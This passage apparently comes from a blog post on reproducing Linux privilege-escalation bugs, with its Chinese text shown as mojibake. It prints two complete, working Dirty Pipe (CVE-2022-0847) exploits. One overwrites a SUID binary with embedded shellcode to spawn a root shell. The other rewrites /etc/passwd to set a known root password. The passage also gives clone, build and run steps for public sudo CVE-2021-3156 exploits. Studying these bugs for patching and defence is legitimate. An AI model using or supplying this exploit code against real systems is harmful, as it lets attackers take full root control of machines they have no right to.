<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//</span><br><span class="line">// dirtypipez.c</span><br><span class="line">//</span><br><span class="line">// hacked up Dirty Pipe (CVE-2022-0847) PoC that hijacks a SUID binary to spawn</span><br><span class="line">// a root shell. (and attempts to restore the damaged binary as well)</span><br><span class="line">//</span><br><span class="line">// Wow, Dirty CoW reloaded!</span><br><span class="line">//</span><br><span class="line">// -- blasty &lt;peter@haxx.in&gt; // 2022-03-07</span><br><span class="line"></span><br><span class="line">/* SPDX-License-Identifier: GPL-2.0 */</span><br><span class="line">/*</span><br><span class="line"> * Copyright 2022 CM4all GmbH / IONOS SE</span><br><span class="line"> *</span><br><span class="line"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span><br><span class="line"> *</span><br><span class="line"> * Proof-of-concept exploit for the Dirty Pipe</span><br><span class="line"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span><br><span class="line"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span><br><span class="line"> * file contents in the page cache, even if the file is not permitted</span><br><span class="line"> * to be written, immutable or on a read-only mount.</span><br><span class="line"> *</span><br><span class="line"> * This exploit requires Linux 5.8 or later; the code path was made</span><br><span class="line"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span><br><span class="line"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span><br><span class="line"> * there before, it just provided an easy way to exploit it.</span><br><span class="line"> *</span><br><span class="line"> * There are two major limitations of this exploit: the offset cannot</span><br><span class="line"> * be on a page boundary (it needs to write one byte before the offset</span><br><span class="line"> * to add a reference to this page to the pipe), and the write cannot</span><br><span class="line"> * cross a page boundary.</span><br><span class="line"> *</span><br><span class="line"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span><br><span class="line"> *</span><br><span class="line"> * Further explanation: https://dirtypipe.cm4all.com/</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/user.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">#ifndef PAGE_SIZE</span><br><span class="line">#define PAGE_SIZE 4096</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">// small (linux x86_64) ELF file matroshka doll that does;</span><br><span class="line">//   fd = open(&quot;/tmp/sh&quot;, O_WRONLY | O_CREAT | O_TRUNC);</span><br><span class="line">//   write(fd, elfcode, elfcode_len)</span><br><span class="line">//   chmod(&quot;/tmp/sh&quot;, 04755)</span><br><span class="line">//   close(fd);</span><br><span class="line">//   exit(0);</span><br><span class="line">//</span><br><span class="line">// the dropped ELF simply does:</span><br><span class="line">//   setuid(0);</span><br><span class="line">//   setgid(0);</span><br><span class="line">//   execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, NULL], [NULL]);</span><br><span class="line">unsigned char elfcode[] = &#123;</span><br><span class="line">	/*0x7f,*/ 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,</span><br><span class="line">	0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,</span><br><span class="line">	0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,</span><br><span class="line">	0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,</span><br><span class="line">	0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,</span><br><span class="line">	0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,</span><br><span class="line">	0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,</span><br><span class="line">	0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,</span><br><span class="line">	0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,</span><br><span class="line">	0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,</span><br><span class="line">	0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,</span><br><span class="line">	0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,</span><br><span class="line">	0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,</span><br><span class="line">	0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,</span><br><span class="line">	0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,</span><br><span class="line">	0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,</span><br><span class="line">	0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,</span><br><span class="line">	0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span><br><span class="line"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span><br><span class="line"> */</span><br><span class="line">static void prepare_pipe(int p[2])</span><br><span class="line">&#123;</span><br><span class="line">	if (pipe(p)) abort();</span><br><span class="line"></span><br><span class="line">	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);</span><br><span class="line">	static char buffer[4096];</span><br><span class="line"></span><br><span class="line">	/* fill the pipe completely; each pipe_buffer will now have</span><br><span class="line">	   the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="line">	for (unsigned r = pipe_size; r &gt; 0;) &#123;</span><br><span class="line">		unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;</span><br><span class="line">		write(p[1], buffer, n);</span><br><span class="line">		r -= n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* drain the pipe, freeing all pipe_buffer instances (but</span><br><span class="line">	   leaving the flags initialized) */</span><br><span class="line">	for (unsigned r = pipe_size; r &gt; 0;) &#123;</span><br><span class="line">		unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;</span><br><span class="line">		read(p[0], buffer, n);</span><br><span class="line">		r -= n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* the pipe is now empty, and if somebody adds a new</span><br><span class="line">	   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span><br><span class="line">	   will be mergeable */</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int hax(char *filename, long offset, uint8_t *data, size_t len) &#123;</span><br><span class="line">	/* open the input file and validate the specified offset */</span><br><span class="line">	const int fd = open(filename, O_RDONLY); // yes, read-only! :-)</span><br><span class="line">	if (fd &lt; 0) &#123;</span><br><span class="line">		perror(&quot;open failed&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	struct stat st;</span><br><span class="line">	if (fstat(fd, &amp;st)) &#123;</span><br><span class="line">		perror(&quot;stat failed&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* create the pipe with all flags initialized with</span><br><span class="line">	   PIPE_BUF_FLAG_CAN_MERGE */</span><br><span class="line">	int p[2];</span><br><span class="line">	prepare_pipe(p);</span><br><span class="line"></span><br><span class="line">	/* splice one byte from before the specified offset into the</span><br><span class="line">	   pipe; this will add a reference to the page cache, but</span><br><span class="line">	   since copy_page_to_iter_pipe() does not initialize the</span><br><span class="line">	   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span><br><span class="line">	--offset;</span><br><span class="line">	ssize_t nbytes = splice(fd, &amp;offset, p[1], NULL, 1, 0);</span><br><span class="line">	if (nbytes &lt; 0) &#123;</span><br><span class="line">		perror(&quot;splice failed&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line">	if (nbytes == 0) &#123;</span><br><span class="line">		fprintf(stderr, &quot;short splice\n&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* the following write will not create a new pipe_buffer, but</span><br><span class="line">	   will instead write into the page cache, because of the</span><br><span class="line">	   PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="line">	nbytes = write(p[1], data, len);</span><br><span class="line">	if (nbytes &lt; 0) &#123;</span><br><span class="line">		perror(&quot;write failed&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line">	if ((size_t)nbytes &lt; len) &#123;</span><br><span class="line">		fprintf(stderr, &quot;short write\n&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">	if (argc != 2) &#123;</span><br><span class="line">		fprintf(stderr, &quot;Usage: %s SUID\n&quot;, argv[0]);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	char *path = argv[1];</span><br><span class="line">	uint8_t *data = elfcode;</span><br><span class="line"></span><br><span class="line">	int fd = open(path, O_RDONLY);</span><br><span class="line">	uint8_t *orig_bytes = malloc(sizeof(elfcode));</span><br><span class="line">	lseek(fd, 1, SEEK_SET);</span><br><span class="line">	read(fd, orig_bytes, sizeof(elfcode));</span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	printf(&quot;[+] hijacking suid binary..\n&quot;);</span><br><span class="line">	if (hax(path, 1, elfcode, sizeof(elfcode)) != 0) &#123;</span><br><span class="line">		printf(&quot;[~] failed\n&quot;);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printf(&quot;[+] dropping suid shell..\n&quot;);</span><br><span class="line">	system(path);</span><br><span class="line"></span><br><span class="line">	printf(&quot;[+] restoring suid binary..\n&quot;);</span><br><span class="line">	if (hax(path, 1, orig_bytes, sizeof(elfcode)) != 0) &#123;</span><br><span class="line">		printf(&quot;[~] failed\n&quot;);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printf(&quot;[+] popping root shell.. (dont forget to clean up /tmp/sh ;))\n&quot;);</span><br><span class="line">	system(&quot;/tmp/sh&quot;);</span><br><span class="line"></span><br><span class="line">	return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h3 id="POC2"><a href="#POC2" class="headerlink" title="POC2"></a>POC2</h3><p>å‚è€ƒ <a href="https://mp.weixin.qq.com/s/HZAYA9CW-biOjkcrTgNuSw">https://mp.weixin.qq.com/s/HZAYA9CW-biOjkcrTgNuSw</a></p>
<p>ç›´æ¥æ›´æ”¹rootè´¦æˆ·çš„å¯†ç ï¼ŒåŸå¯†ç ä¼šå¤‡ä»½åˆ° <code>/tmp/passwd.bak</code> </p>
<p>è¿˜åŸå¯†ç  <code>mv /tmp/passwd.bak /etc/passwd</code></p>
<p><img src="/posts/1a565dd/4.png" alt="æˆªå›¾"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* SPDX-License-Identifier: GPL-2.0 */</span><br><span class="line">/*</span><br><span class="line"> * Copyright 2022 CM4all GmbH / IONOS SE</span><br><span class="line"> *</span><br><span class="line"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span><br><span class="line"> *</span><br><span class="line"> * Proof-of-concept exploit for the Dirty Pipe</span><br><span class="line"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span><br><span class="line"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span><br><span class="line"> * file contents in the page cache, even if the file is not permitted</span><br><span class="line"> * to be written, immutable or on a read-only mount.</span><br><span class="line"> *</span><br><span class="line"> * This exploit requires Linux 5.8 or later; the code path was made</span><br><span class="line"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span><br><span class="line"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span><br><span class="line"> * there before, it just provided an easy way to exploit it.</span><br><span class="line"> *</span><br><span class="line"> * There are two major limitations of this exploit: the offset cannot</span><br><span class="line"> * be on a page boundary (it needs to write one byte before the offset</span><br><span class="line"> * to add a reference to this page to the pipe), and the write cannot</span><br><span class="line"> * cross a page boundary.</span><br><span class="line"> *</span><br><span class="line"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span><br><span class="line"> *</span><br><span class="line"> * Further explanation: https://dirtypipe.cm4all.com/</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/user.h&gt;</span><br><span class="line"></span><br><span class="line">#ifndef PAGE_SIZE</span><br><span class="line">#define PAGE_SIZE 4096</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span><br><span class="line"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span><br><span class="line"> */</span><br><span class="line">static void prepare_pipe(int p[2])</span><br><span class="line">&#123;</span><br><span class="line">        if (pipe(p)) abort();</span><br><span class="line"></span><br><span class="line">        const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);</span><br><span class="line">        static char buffer[4096];</span><br><span class="line"></span><br><span class="line">        /* fill the pipe completely; each pipe_buffer will now have</span><br><span class="line">           the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="line">        for (unsigned r = pipe_size; r &gt; 0;) &#123;</span><br><span class="line">                unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;</span><br><span class="line">                write(p[1], buffer, n);</span><br><span class="line">                r -= n;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* drain the pipe, freeing all pipe_buffer instances (but</span><br><span class="line">           leaving the flags initialized) */</span><br><span class="line">        for (unsigned r = pipe_size; r &gt; 0;) &#123;</span><br><span class="line">                unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;</span><br><span class="line">                read(p[0], buffer, n);</span><br><span class="line">                r -= n;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* the pipe is now empty, and if somebody adds a new</span><br><span class="line">           pipe_buffer without initializing its &quot;flags&quot;, the buffer</span><br><span class="line">           will be mergeable */</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">        const char *const path = &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">        printf(&quot;Backing up /etc/passwd to /tmp/passwd.bak ...\n&quot;);</span><br><span class="line">        FILE *f1 = fopen(&quot;/etc/passwd&quot;, &quot;r&quot;);</span><br><span class="line">        FILE *f2 = fopen(&quot;/tmp/passwd.bak&quot;, &quot;w&quot;);</span><br><span class="line"></span><br><span class="line">        if (f1 == NULL) &#123;</span><br><span class="line">            printf(&quot;Failed to open /etc/passwd\n&quot;);</span><br><span class="line">            exit(EXIT_FAILURE);</span><br><span class="line">        &#125; else if (f2 == NULL) &#123;</span><br><span class="line">            printf(&quot;Failed to open /tmp/passwd.bak\n&quot;);</span><br><span class="line">            fclose(f1);</span><br><span class="line">            exit(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        char c;</span><br><span class="line">        while ((c = fgetc(f1)) != EOF)</span><br><span class="line">            fputc(c, f2);</span><br><span class="line"></span><br><span class="line">        fclose(f1);</span><br><span class="line">        fclose(f2);</span><br><span class="line"></span><br><span class="line">        loff_t offset = 4; // after the &quot;root&quot;</span><br><span class="line">        const char *const data = &quot;:$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\n&quot;; // openssl passwd -1 -salt aaron aaron </span><br><span class="line">        printf(&quot;Setting root password to \&quot;aaron\&quot;...\n&quot;);</span><br><span class="line">        const size_t data_size = strlen(data);</span><br><span class="line"></span><br><span class="line">        if (offset % PAGE_SIZE == 0) &#123;</span><br><span class="line">                fprintf(stderr, &quot;Sorry, cannot start writing at a page boundary\n&quot;);</span><br><span class="line">                return EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;</span><br><span class="line">        const loff_t end_offset = offset + (loff_t)data_size;</span><br><span class="line">        if (end_offset &gt; next_page) &#123;</span><br><span class="line">                fprintf(stderr, &quot;Sorry, cannot write across a page boundary\n&quot;);</span><br><span class="line">                return EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* open the input file and validate the specified offset */</span><br><span class="line">        const int fd = open(path, O_RDONLY); // yes, read-only! :-)</span><br><span class="line">        if (fd &lt; 0) &#123;</span><br><span class="line">                perror(&quot;open failed&quot;);</span><br><span class="line">                return EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        struct stat st;</span><br><span class="line">        if (fstat(fd, &amp;st)) &#123;</span><br><span class="line">                perror(&quot;stat failed&quot;);</span><br><span class="line">                return EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (offset &gt; st.st_size) &#123;</span><br><span class="line">                fprintf(stderr, &quot;Offset is not inside the file\n&quot;);</span><br><span class="line">                return EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (end_offset &gt; st.st_size) &#123;</span><br><span class="line">                fprintf(stderr, &quot;Sorry, cannot enlarge the file\n&quot;);</span><br><span class="line">                return EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* create the pipe with all flags initialized with</span><br><span class="line">           PIPE_BUF_FLAG_CAN_MERGE */</span><br><span class="line">        int p[2];</span><br><span class="line">        prepare_pipe(p);</span><br><span class="line"></span><br><span class="line">        /* splice one byte from before the specified offset into the</span><br><span class="line">           pipe; this will add a reference to the page cache, but</span><br><span class="line">           since copy_page_to_iter_pipe() does not initialize the</span><br><span class="line">           &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span><br><span class="line">        --offset;</span><br><span class="line">        ssize_t nbytes = splice(fd, &amp;offset, p[1], NULL, 1, 0);</span><br><span class="line">        if (nbytes &lt; 0) &#123;</span><br><span class="line">                perror(&quot;splice failed&quot;);</span><br><span class="line">                return EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        if (nbytes == 0) &#123;</span><br><span class="line">                fprintf(stderr, &quot;short splice\n&quot;);</span><br><span class="line">                return EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* the following write will not create a new pipe_buffer, but</span><br><span class="line">           will instead write into the page cache, because of the</span><br><span class="line">           PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="line">        nbytes = write(p[1], data, data_size);</span><br><span class="line">        if (nbytes &lt; 0) &#123;</span><br><span class="line">                perror(&quot;write failed&quot;);</span><br><span class="line">                return EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        if ((size_t)nbytes &lt; data_size) &#123;</span><br><span class="line">                fprintf(stderr, &quot;short write\n&quot;);</span><br><span class="line">                return EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        char *argv[] = &#123;&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;(echo aaron; cat) | su - -c \&quot;&quot;</span><br><span class="line">                &quot;echo \\\&quot;Restoring /etc/passwd from /tmp/passwd.bak...\\\&quot;;&quot;</span><br><span class="line">                &quot;cp /tmp/passwd.bak /etc/passwd;&quot;</span><br><span class="line">                &quot;echo \\\&quot;Done! Popping shell... (run commands now)\\\&quot;;&quot;</span><br><span class="line">                &quot;/bin/sh;&quot;</span><br><span class="line">            &quot;\&quot; root&quot;&#125;;</span><br><span class="line">        execv(&quot;/bin/sh&quot;, argv);</span><br><span class="line"></span><br><span class="line">        printf(&quot;system() function call seems to have failed :(\n&quot;);</span><br><span class="line">        return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">     </span><br><span class="line">     </span><br></pre></td></tr></table></figure>



<h2 id="sudoæƒé™æå‡æ¼æ´-CVE-2021-3156"><a href="#sudoæƒé™æå‡æ¼æ´-CVE-2021-3156" class="headerlink" title="sudoæƒé™æå‡æ¼æ´ CVE-2021-3156"></a>sudoæƒé™æå‡æ¼æ´ CVE-2021-3156</h2><h3 id="æ¼æ´æè¿°-2"><a href="#æ¼æ´æè¿°-2" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h3><p>2021å¹´1æœˆ26æ—¥ï¼ŒLinuxå®‰å…¨å·¥å…·sudoè¢«å‘ç°ä¸¥é‡çš„åŸºäºå †ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚åˆ©ç”¨è¿™ä¸€æ¼æ´ï¼Œæ”»å‡»è€…æ— éœ€çŸ¥é“ç”¨æˆ·å¯†ç ï¼Œä¸€æ ·å¯ä»¥è·å¾—rootæƒé™ï¼Œå¹¶ä¸”æ˜¯åœ¨é»˜è®¤é…ç½®ä¸‹ã€‚æ­¤æ¼æ´å·²åˆ†é…ä¸ºCVE-2021-3156ï¼Œå±é™©ç­‰çº§è¯„åˆ†ä¸º7åˆ†ã€‚ å½“sudoé€šè¿‡-sæˆ–-iå‘½ä»¤è¡Œé€‰é¡¹åœ¨shellæ¨¡å¼ä¸‹è¿è¡Œå‘½ä»¤æ—¶ï¼Œå®ƒå°†åœ¨å‘½ä»¤å‚æ•°ä¸­ä½¿ç”¨åæ–œæ è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ã€‚ä½†ä½¿ç”¨-sæˆ–-iæ ‡å¿—è¿è¡Œsudoeditæ—¶ï¼Œå®é™…ä¸Šå¹¶æœªè¿›è¡Œè½¬ä¹‰ï¼Œä»è€Œå¯èƒ½å¯¼è‡´ç¼“å†²åŒºæº¢å‡ºã€‚å› æ­¤åªè¦å­˜åœ¨sudoersæ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯/etc/sudoersï¼‰ï¼Œæ”»å‡»è€…å°±å¯ä»¥ä½¿ç”¨æœ¬åœ°æ™®é€šç”¨æˆ·åˆ©ç”¨sudoè·å¾—ç³»ç»Ÿrootæƒé™ã€‚ç ”ç©¶äººå‘˜åˆ©ç”¨è¯¥æ¼æ´åœ¨å¤šä¸ªLinuxå‘è¡Œç‰ˆä¸ŠæˆåŠŸè·å¾—äº†å®Œæ•´çš„rootæƒé™ï¼ŒåŒ…æ‹¬Ubuntu 20.04ï¼ˆsudo 1.8.31ï¼‰ã€Debian 10ï¼ˆsudo 1.8.27ï¼‰å’ŒFedora 33ï¼ˆsudo 1.9.2ï¼‰ï¼Œå¹¶ä¸”sudoæ”¯æŒçš„å…¶ä»–æ“ä½œç³»ç»Ÿå’ŒLinuxå‘è¡Œç‰ˆä¹Ÿå¾ˆå®¹æ˜“å—åˆ°æ”»å‡»ã€‚</p>
<h3 id="æ¼æ´å½±å“-1"><a href="#æ¼æ´å½±å“-1" class="headerlink" title="æ¼æ´å½±å“"></a>æ¼æ´å½±å“</h3><ul>
<li>Sudo 1.8.2 - 1.8.31p2</li>
<li>Sudo 1.9.0 - 1.9.5p1</li>
</ul>
<h3 id="æ¼æ´å¤ç°-2"><a href="#æ¼æ´å¤ç°-2" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><h4 id="POC1"><a href="#POC1" class="headerlink" title="POC1"></a>POC1</h4><p><code>git clone https://github.com/Rvn0xsy/CVE-2021-3156-plus</code></p>
<p>ç”±äºå¤ç°æ—¶ä½¿ç”¨çš„ç‰ˆæœ¬è¿‡é«˜ï¼Œç„¶åé€‰æ‹©ä¸‹è°ƒåˆ°ä½ç‰ˆæœ¬sudo è¿›è¡Œæµ‹è¯• <code>sudo apt install sudo=1.8.31-1ubuntu1</code></p>
<p><code>make</code></p>
<p><code>./expolit &quot;id&quot;</code></p>
<p><img src="/posts/1a565dd/5.png" alt="æˆªå›¾"></p>
<br>

<br>

<h4 id="POC2-1"><a href="#POC2-1" class="headerlink" title="POC2"></a>POC2</h4><p><code>git clone https://github.com/blasty/CVE-2021-3156</code></p>
<p><code>make</code></p>
<p><code>./sudo-hax-me-a-sandwich</code></p>
<p><code>./sudo-hax-me-a-sandwich &lt;target_number&gt;</code></p>
<p><img src="/posts/1a565dd/6.png" alt="æˆªå›¾"></p>
<h2 id="kernelæƒé™æå‡æ¼æ´-CVE-2021-3493"><a href="#kernelæƒé™æå‡æ¼æ´-CVE-2021-3493" class="headerlink" title="kernelæƒé™æå‡æ¼æ´ CVE-2021-3493"></a>kernelæƒé™æå‡æ¼æ´ CVE-2021-3493</h2><h3 id="æ¼æ´æè¿°-3"><a href="#æ¼æ´æè¿°-3" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h3><p>Ubuntu OverlayFS Local Privesc CVE-2021-3493 EXPåœ¨Githubè¢«å…¬å¼€ï¼Œå¯ä»¥é€šè¿‡EXPåœ¨Ubuntuå¤šä¸ªå½±å“ç³»ç»Ÿä¸­æå‡ ROOTæƒé™</p>
<h3 id="æ¼æ´å½±å“-2"><a href="#æ¼æ´å½±å“-2" class="headerlink" title="æ¼æ´å½±å“"></a>æ¼æ´å½±å“</h3><ul>
<li>Ubuntu 20.10</li>
<li>Ubuntu 20.04 LTS</li>
<li>Ubuntu 18.04 LTS</li>
<li>Ubuntu 16.04 LTS</li>
<li>Ubuntu 14.04 ESM</li>
</ul>
<br>

<h3 id="æ¼æ´å¤ç°-3"><a href="#æ¼æ´å¤ç°-3" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><blockquote>
<p>æ¼æ´Githubåœ°å€ä¸ºï¼š<a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p>
</blockquote>
<br>

